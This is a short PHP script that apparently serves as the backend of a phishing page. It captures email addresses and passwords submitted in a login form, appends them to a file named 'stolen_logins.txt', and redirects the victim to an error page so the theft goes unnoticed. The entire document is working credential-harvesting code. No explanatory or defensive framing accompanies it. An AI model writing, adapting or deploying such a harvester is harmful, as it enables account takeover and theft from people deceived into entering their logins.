<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];
    file_put_contents("stolen_logins.txt", "Email: $email, Password: $password\n", FILE_APPEND);
    header("Location: error.html");
    exit();
}
?>